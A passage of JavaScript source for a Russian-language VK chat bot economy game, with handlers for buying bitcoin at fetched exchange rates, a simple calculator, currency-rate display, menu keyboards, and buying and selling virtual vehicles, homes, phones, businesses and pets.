		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
	while(res.includes(`всё`)){
		res = res.replace(`всё`,`${user.balance}`)
	}
	while(res.includes(`все`)){
		res = res.replace(`все`,`${user.balance}`)
	}
	while(res.includes(`вабанк`)){
		res = res.replace(`вабанк`,`${user.balance}`)
	}
	let colvo = Number(res)
	if(!Number(colvo)) return
	const bit = await request("http://api.cryptonator.com/api/ticker/btc-usd"); 
	var x = JSON.parse(bit)
	let price = Math.floor(Number(x.ticker.price) * colvo)
	let kyrs = Math.floor(Number(x.ticker.price))
	if(price > user.balance) return context.send(`
		${nick}, у Вас недостаточно денег 😔
		Стоимость одного биткоина ${utils.sp(kyrs)}$, ваш баланс: ${utils.sp(user.balance)}$`)
	user.btc += Number(colvo)
	user.balance -= Number(price)
	return context.send(`
		${nick}, вы купили ${utils.sp(colvo)}฿ за ${utils.sp(price)}$
		💰 Ваш баланс: ${utils.sp(user.balance)}$`)
})


updates.hear(/реши (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let primer = context.$match[1]
if(primer.includes(`+`)) {
var plus = '+';
var array = splitString(primer, plus);
let one = Number(array[0])
let ans = one 
ans = ans += Number(array[1])
if(!Number(ans)) return context.send(`${nick}, пример введен неверно! 😣`)
return context.send(`${nick}, ${one}+${array[1]}=${ans}`)
}
if(primer.includes(`-`)) {
var plus = '-';
var array = splitString(primer, plus);
let one = Number(array[0])
let ans = one 
ans = ans -= Number(array[1])
if(!Number(ans)) return context.send(`${nick}, пример введен неверно! 😣`)
return context.send(`${nick}, ${one}-${array[1]}=${ans}`)
}
if(primer.includes(`*`)) {
var plus = '*';
var array = splitString(primer, plus);
let one = Number(array[0])
let ans = one 
ans = ans *= Number(array[1])
if(!Number(ans)) return context.send(`${nick}, пример введен неверно! 😣`)
return context.send(`${nick}, ${one}*${array[1]}=${ans}`)
}
if(primer.includes(`/`)) {
var plus = '/';
var array = splitString(primer, plus);
let one = Number(array[0])
let ans = one 
ans = ans /= Number(array[1])
if(!Number(ans)) return context.send(`${nick}, пример введен неверно! 😣`)
return context.send(`${nick}, ${one}/${array[1]}=${ans}`)
}
if(primer.includes(`:`)) {
var plus = ':';
var array = splitString(primer, plus);
let one = Number(array[0])
let ans = one 
ans = ans /= Number(array[1])
if(!Number(ans)) return context.send(`${nick}, пример введен неверно! 😣`)
return context.send(`${nick}, ${one}:${array[1]}=${ans}`)
}
if(!Number(context.$match[1])) return context.send(`${nick}, пример введен неверно! 😣`)
return context.send(`${nick}, ${context.$match[1]}=${context.$match[1]}`)
})

updates.hear(/(?:реши)\s([0-9]+)+([0+9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	//console.log(`b`)
	//console.log(context.$match[1])
	let ans = context.$match[1] += Nunber(context.$match[2])
	return context.send(`${nick}, ${context.$match[1]}+${context.$match[2]}=${ans}`)
	
	})

updates.hear(/реши (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, пример введен неверно! 😣`)
	})
updates.hear(/реши$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, используй: «реши [пример]» (без скобок и кавычек) 👍`)
	})


updates.hear(/курс$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	const bit = await request("http://api.cryptonator.com/api/ticker/btc-usd"); 
var x = JSON.parse(bit) 
const bitr = await request("http://api.cryptonator.com/api/ticker/btc-rub"); 
var c = JSON.parse(bitr) 
const usd = await request("http://api.cryptonator.com/api/ticker/usd-rub"); 
var u = JSON.parse(usd) 
const eur = await request("http://api.cryptonator.com/api/ticker/eur-rub"); 
var e = JSON.parse(eur) 

return context.send(`${nick}, курс валют на данный момент:
💵 Доллар США: ${Math.floor(Number(u.ticker.price))}₽
💶 Евро: ${Math.floor(Number(e.ticker.price))}₽
💸 Биткоин: ${Math.floor(Number(x.ticker.price))}$ или ${Math.floor(c.ticker.price)}₽ `) 

})

updates.hear(/разное$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send({message: `${nick}, раздел <<разное>> 👍`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📒 Профиль', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💲 Баланс', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '👑 Рейтинг', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🛍 Магазин', 
            color: Keyboard.PRIMARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💸 Продать', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🏆 Топ', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      	[
      	Keyboard.textButton({ 
        label: '🤝 Передать', 
        color: Keyboard.SECONDARY_COLOR,
        }),
        Keyboard.textButton({ 
        label: '💰 Банк', 
        color: Keyboard.SECONDARY_COLOR,
        }),
        Keyboard.textButton({ 
        label: '◀ В главное меню', 
        color: Keyboard.SECONDARY_COLOR,
        })

        ]
     ])
     .inline(platform)
  })
	})

updates.hear(/главное меню$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send({ 
message: `${nick}, возвращение в главное меню...`, 
     keyboard: Keyboard.keyboard([  
      [ 
            Keyboard.textButton({ 
            label: '🚀 Игры', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
            Keyboard.textButton({ 
            label: '🖨️ Реши', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
            Keyboard.textButton({ 
            label: '📊 Курс', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],    
      [             
            Keyboard.textButton({ 
            label: '💡 Разное', 
            color: Keyboard.SECONDARY_COLOR,
            })             
       ],
       [
       Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
        Keyboard.textButton({ 
            label: '❓ Помощь', 
            color: Keyboard.SECONDARY_COLOR,
            }),         
            Keyboard.textButton({ 
            label: '💰 Команды банка', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
       ]      
   ])
   .inline(platform)
  }) 
  })


updates.hear(/продать машину|продать машины$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.carid < 1) return context.send(`${nick}, у вас нет машины 
❓ Для покупки введите «машина»`)
for(let o in cars){
if(cars[o].id == user.carid){
let sell = cars[o].cost
sell /= 2
sell = Math.trunc(sell)
user.carid = 0
user.carname = ``
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${cars[o].name} за ${utils.sp(sell)}$`)
}
}
})


updates.hear(/продать вертолет|продать вертолёт|продать вертолеты|продать вертолёты$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.helicopter < 1) return context.send(`${nick}, у вас нет вертолёта 
❓ Для покупки введите «вертолёт»`)
for(let o in helicopters){
if(helicopters[o].id == user.helicopterid){
let sell = helicopters[o].cost
sell /= 2
sell = Math.trunc(sell)
user.helicopterid = 0
user.helicoptername = ``
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${helicopters[o].name} за ${utils.sp(sell)}$`)
}
}
})


updates.hear(/продать самолёт|продать самолёты|продать самолет|продать самолеты$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.airplaneid < 1) return context.send(`${nick}, у вас нет самолёта 
❓ Для покупки введите «самолёты»`)
for(let o in airplanes){
if(airplanes[o].id == user.airplaneid){
let sell = airplanes[o].cost
sell /= 2
sell = Math.trunc(sell)
user.airplaneid = 0
user.airplanename = ``
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${airplanes[o].name} за ${utils.sp(sell)}$`)
}
}
})

updates.hear(/продать дом|продать дома$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.homeid < 1) return context.send(`${nick}, у вас нет дома 
❓ Для покупки введите <<яхты>>`)
for(let o in homes){
if(homes[o].id == user.homeid){
let sell = homes[o].cost
sell /= 2
sell = Math.trunc(sell)
user.homeid = 0
user.homename = ``
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${homes[o].name} за ${utils.sp(sell)}$`)
}
}
})

updates.hear(/продать квартиру|продать квартиры$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.kvartiraid < 1) return context.send(`${nick}, у вас нет квартиры 
❓ Для покупки введите <<квартиры>>`)
for(let o in kvartiri){
if(kvartiri[o].id == user.kvartiraid){
let sell = kvartiri[o].cost
sell /= 2
sell = Math.trunc(sell)
user.kvartiraid = 0
user.kvartiraname = ``
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${kvartiri[o].name} за ${utils.sp(sell)}$`)
}
}
})

updates.hear(/продать телефон|продать телефоны$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.phoneid < 1) return context.send(`${nick}, у вас нет телефона 
❓ Для покупки введите <<телефон>>`)
for(let o in phones){
if(phones[o].id == user.phoneid){
let sell = phones[o].cost
sell /= 2
sell = Math.trunc(sell)
user.phoneid = 0
user.phonename = ``
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${phones[o].name} за ${utils.sp(sell)}$`)
}
}
})

updates.hear(/продать бизнес$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.biznesid < 1) return context.send(`${nick}, у вас нет бизнеса 
❓ Для покупки введите <<бизнесы>>`)
for(let o in biznesi){
if(biznesi[o].id == user.biznesid){
let sell = biznesi[o].cost
sell /= 2
sell = Math.trunc(sell)
user.biznesid = 0
user.biznesname = ``
user.biznesworkers = 0
user.biznesmaxworkers = 0
user.biznespribil = 0
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${biznesi[o].name} за ${utils.sp(sell)}$`)
}
}
})

updates.hear(/продать питомец|продать питомца$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.petid < 1) return context.send(`${nick}, у вас нет питомца 
❓ Для покупки введите <<питомцы>>`)
for(let o in pets){
if(pets[o].id == user.petid){
let sell = pets[o].cost
sell /= 2
sell = Math.trunc(sell)
user.petid = 0
user.petname = ``
user.petlvl = 0
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${pets[o].name} за ${utils.sp(sell)}$`)
}
}
})


updates.hear(/продать яхту|продать яхты$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.yachtid < 1) return context.send(`${nick}, у вас нет яхты 
❓ Для покупки введите <<яхты>>`)
for(let o in yachts){
if(yachts[o].id == user.yachtid){
let sell = yachts[o].cost
sell /= 2
sell = Math.trunc(sell)
user.yachtid = 0
user.yachtname = ``
user.balance += Number(sell)
return context.send(`${nick}, вы продали ${yachts[o].name} за ${utils.sp(sell)}$`)
}
}
})

updates.hear(/машина (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let car = Number(context.$match[1])
if(car > 27) return context.send(`${nick}, Неверный номер 😒`)
if(car < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.carid > 0) return context.send(`${nick}, у вас уже есть машина - ${user.carname} 😟
❓ Для продажи введите «Продать машину»`)

for(let o in cars){
if(cars[o].id == car){
if(user.balance < Number(cars[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(cars[o].cost)
user.carid = Number(car)
user.carname = `${cars[o].name}`
return context.send(`${nick}, вы купили машину «${cars[o].name}» за ${utils.sp(cars[o].cost)}$`)
}
}

})


updates.hear(/яхта (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let yacht = Number(context.$match[1])
if(yacht > 13) return context.send(`${nick}, Неверный номер 😒`)
if(yacht < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.yachtid > 0) return context.send(`${nick}, у вас уже есть яхта - ${user.yachtname} 😟
❓ Для продажи введите «Продать яхту>>`)

for(let o in yachts){
if(yachts[o].id == yacht){
if(user.balance < Number(yachts[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(yachts[o].cost)
user.yachtid = Number(yacht)
user.yachtname = `${yachts[o].name}`
return context.send(`${nick}, вы купили яхту «${yachts[o].name}» за ${utils.sp(yachts[o].cost)}$`)
}
}

})


updates.hear(/вертолет (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let helicopter = Number(context.$match[1])
if(helicopter > 15) return context.send(`${nick}, Неверный номер 😒`)
if(helicopter < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.helicopterid > 0) return context.send(`${nick}, у вас уже есть вертолёт - ${user.helicoptername} 😟
❓ Для продажи введите «Продать вертолёт>>`)

for(let o in helicopters){
if(helicopters[o].id == helicopter){
if(user.balance < Number(helicopters[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(helicopters[o].cost)
user.helicopterid = Number(helicopter)
user.helicoptername = `${helicopters[o].name}`
return context.send(`${nick}, вы купили вертолёт «${helicopters[o].name}» за ${utils.sp(helicopters[o].cost)}$`)
}
}

})

updates.hear(/вертолёт (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let helicopter = Number(context.$match[1])
if(helicopter > 15) return context.send(`${nick}, Неверный номер 😒`)
if(helicopter < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.helicopterid > 0) return context.send(`${nick}, у вас уже есть вертолёт - ${user.helicoptername} 😟
❓ Для продажи введите «Продать вертолёт>>`)

for(let o in helicopters){
if(helicopters[o].id == helicopter){
if(user.balance < Number(helicopters[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(helicopters[o].cost)
user.helicopterid = Number(helicopter)
user.helicoptername = `${helicopters[o].name}`
return context.send(`${nick}, вы купили вертолёт «${helicopters[o].name}» за ${utils.sp(helicopters[o].cost)}$`)
}
}

})


updates.hear(/самолет (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let airplane = Number(context.$match[1])
if(airplane > 18) return context.send(`${nick}, Неверный номер 😒`)
if(airplane < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.airplaneid > 0) return context.send(`${nick}, у вас уже есть самолёт - ${user.airplanename} 😟
❓ Для продажи введите «Продать самолёт>>`)

for(let o in airplanes){
if(airplanes[o].id == airplane){
if(user.balance < Number(airplanes[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(airplanes[o].cost)
user.airplaneid = Number(airplane)
user.airplanename = `${airplanes[o].name}`
return context.send(`${nick}, вы купили самолёт «${airplanes[o].name}» за ${utils.sp(airplanes[o].cost)}$`)
}
}

})

updates.hear(/дом (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let home = Number(context.$match[1])
if(home > 15) return context.send(`${nick}, Неверный номер 😒`)
if(home < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.home > 0) return context.send(`${nick}, у вас уже есть дом - ${user.homename} 😟
❓ Для продажи введите «Продать дом>>`)

for(let o in homes){
if(homes[o].id == home){
if(user.balance < Number(homes[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(homes[o].cost)
user.homeid = Number(home)
user.homename = `${homes[o].name}`
return context.send(`${nick}, вы купили дом «${homes[o].name}» за ${utils.sp(homes[o].cost)}$`)
}
}

})

updates.hear(/квартира (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let kvartira = Number(context.$match[1])
if(kvartira > 10) return context.send(`${nick}, Неверный номер 😒`)
if(kvartira < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.kvartiraid > 0) return context.send(`${nick}, у вас уже есть квартира - ${user.kvartiraname} 😟
❓ Для продажи введите «Продать квартиру>>`)

for(let o in kvartiri){
if(kvartiri[o].id == kvartira){
if(user.balance < Number(kvartiri[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(kvartiri[o].cost)
user.kvartiraid = Number(kvartira)
user.kvartiraname = `${kvartiri[o].name}`
return context.send(`${nick}, вы купили квартиру «${kvartiri[o].name}» за ${utils.sp(kvartiri[o].cost)}$`)
}
}

})

updates.hear(/телефон (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let phone = Number(context.$match[1])
if(phone > 10) return context.send(`${nick}, Неверный номер 😒`)
if(phone < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.phoneid > 0) return context.send(`${nick}, у вас уже есть телефон - ${user.phonename} 😟
❓ Для продажи введите «Продать телефон>>`)

for(let o in phones){
if(phones[o].id == phone){
if(user.balance < Number(phones[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(phones[o].cost)
user.phoneid = Number(phone)
user.phonename = `${phones[o].name}`
return context.send(`${nick}, вы купили телефон «${phones[o].name}» за ${utils.sp(phones[o].cost)}$`)
}
}

})


updates.hear(/самолёт (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let airplane = Number(context.$match[1])
if(airplane > 18) return context.send(`${nick}, Неверный номер 😒`)
if(airplane < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.airplaneid > 0) return context.send(`${nick}, у вас уже есть самолёт - ${user.airplanename} 😟
❓ Для продажи введите «Продать самолёт>>`)

for(let o in airplanes){
if(airplanes[o].id == airplane){
if(user.balance < Number(airplanes[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(airplanes[o].cost)
user.airplaneid = Number(airplane)
user.airplanename = `${airplanes[o].name}`
return context.send(`${nick}, вы купили самолёт «${airplanes[o].name}» за ${utils.sp(airplanes[o].cost)}$`)
}
}

})

updates.hear(/самолёты|самолеты|самолёт|самолет$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in airplanes){
list += `\n🔸 ${airplanes[o].id}. ${airplanes[o].name} [${utils.sp(airplanes[o].cost)}$]`	
}
return context.send(`${nick}, самолёты: ${list}\n\n❓ Для покупки введите «самолёт [номер]»`)
})

updates.hear(/дом|дома$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in homes){
list += `\n🔸 ${homes[o].id}. ${homes[o].name} [${utils.sp(homes[o].cost)}$]`	
}
return context.send(`${nick}, дома: ${list}\n\n❓ Для покупки введите «дом [номер]»`)
})

updates.hear(/яхты|яхта$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in yachts){
list += `\n🔸 ${yachts[o].id}. ${yachts[o].name} [${utils.sp(yachts[o].cost)}$]`	
}
return context.send(`${nick}, яхты: ${list}\n\n❓ Для покупки введите «яхта [номер]»`)
})

updates.hear(/вертолеты|вертолёты|вертолет|вертолёт$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in helicopters){
list += `\n🔸 ${helicopters[o].id}. ${helicopters[o].name} [${utils.sp(helicopters[o].cost)}$]`	
}
return context.send(`${nick}, вертолёты: ${list}\n\n❓ Для покупки введите «вертолёт [номер]»`)
})




updates.hear(/квартира|квартиры$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in kvartiri){
list += `\n🔸 ${kvartiri[o].id}. ${kvartiri[o].name} [${utils.sp(kvartiri[o].cost)}$]`	
}
return context.send(`${nick}, квартиры: ${list}\n\n❓ Для покупки введите «квартира [номер]»`)
})


updates.hear(/телефон|телефоны$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let list = ``
for(let o in phones){
list += `\n🔸 ${phones[o].id}. ${phones[o].name} [${utils.sp(phones[o].cost)}$]`	
}
return context.send(`${nick}, телефоны: ${list}\n\n❓ Для покупки введите «телефон [номер]»`)
})


updates.hear(/машины|машина$/i,(context) => {
let platform = false
